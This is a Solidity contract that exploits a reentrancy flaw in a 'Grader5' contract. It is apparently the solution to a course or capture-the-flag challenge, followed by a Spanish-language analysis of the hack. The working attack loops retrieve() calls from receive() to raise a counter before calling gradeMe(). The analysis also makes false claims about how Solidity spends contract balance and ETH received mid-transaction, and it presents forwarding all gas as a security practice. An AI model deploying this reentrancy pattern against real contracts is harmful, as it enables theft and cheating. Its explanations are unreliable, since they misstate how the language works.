// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

interface IGrader5 {
    function retrieve() external payable;
    function gradeMe(string calldata name) external;
    function counter(address) external view returns (uint256);
}

contract Jaquer {
    IGrader5 public grader;
    string public targetName;
    uint256 public retrieveCount;
    address public owner;

    /****   Modifiers / Requiers   *******/

    //@notice: Restricts access to contract owner
    //@dev: Reverts if caller is not the owner
    modifier onlyOwner(){
        require(owner==msg.sender, "not the owner");
        _;
    }
    
    constructor(address graderAddress) payable {
        owner=msg.sender;
        grader = IGrader5(graderAddress);
    }
    
    function attack(string calldata name) external payable {
        require(msg.value >= 12, "Need at least 12 wei");  // See HACK ANALYSIS below
        targetName = name;
        retrieveCount = 0;
        // Iniciamos el proceso llamando a retrieve por primera vez
        grader.retrieve{value: 4}();  // require(msg.value > 3,"not enough money"); Grader5 (line 20)
    }

    
    // called by Grade5: payable(msg.sender).call{value: 1, gas: gasleft()}(""); Grader5 (line 23)
    receive() external payable {
        retrieveCount++;
        // Verificamos si ya cumplimos con counter > 1 - sino lo resetea
        if (grader.counter(address(this)) > 1) {   // if(counter[msg.sender]<2); Grader5 (line 22)
            // Si ya tenemos counter > 1, llamamos a gradeMe
            grader.gradeMe(targetName);
        } else {
            // Si no, seguimos llamando a retrieve
            if (retrieveCount < 3) { // require(counter[msg.sender]<4); Grader5 (line 22)
                grader.retrieve{value: 4}();
            }
        }
    }
    
    // Función para retirar fondos del contrato
    function withdraw() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
}


/* ANÁLISIS DEL HACK sobre Grader5

# Esta vulnerabilidad existe porque el contrato Grader5 confía en que msg.sender será un usuario legítimo y no verifica si es un contrato 
que pueda volver a llamar a Gader5 cuando este último hace un CALL al sender: payable(msg.sender).call{value: 1, gas: gasleft()}("");
        - gasleft() en este contexto es un patrón de seguridad y buena práctica que:
          Garantiza que el contrato receptor tenga suficiente gas para ejecutarse

Una solución sería usar OpenZeppelin's isContract() para prevenir que contratos llamen a estas funciones.

# El contrato Jaquer necesita suficiente ETH para las 3 llamadas (12 wei mínimo).

# El nombre proporcionado a gradeMe debe ser único (no registrado previamente en el contrato Grader5).

# El ataque solo funcionará si:
    - el timestamp actual está dentro del rango permitido por startTime y deadline (que por defecto son valores que permiten casi cualquier timestamp actual).
    - el primer msg.Value > 3 wei
    - luego del primer llamado a retrieve(), en el callback() el hacker se vuelve a llamar a retrieve() para incrementar el counter[msg.sender]

# Necesitamos especificar msg.value >12 en la llamada inicial además de cada llamada a retrieve() (aunque el contrato tenga saldo suficiente). 
   Esto es así por cómo Solidity maneja el ETH durante las llamadas entre contratos. Cuando hacemos:  	
        grader.retrieve{value: 4}();
   No estámos usando el saldo del contrato, sino que estamos enviando ETH junto con la llamada. 
   Esto es clave porque:

	a)  El value: 4 debe venir explícitamente de:
	      - El msg.value de la transacción inicial, o
	      - ETH recibido en la misma transacción (pero hay limitaciones)
	b) El saldo del contrato no se usa automáticamente para estas llamadas.

  ¿Por qué no basta con que el contrato tenga saldo?:
	a) Mecanismo de seguridad: Solidity no permite usar el saldo del contrato automáticamente en llamadas externas para evitar gastos no intencionales.
	b) Problema con callbacks recursivos:
             - Cuando recibes ETH en receive(), ese ETH no está disponible inmediatamente para usar en la siguiente llamada.
	     - El saldo se actualiza después de que termina la ejecución completa.

  En resumen, usar msg.value es necesario porque:
	- Garantiza que hay ETH disponible para todas las llamadas
	- Hace el flujo completo en una sola transacción
	- Es el patrón más común para este tipo de interacciones

*/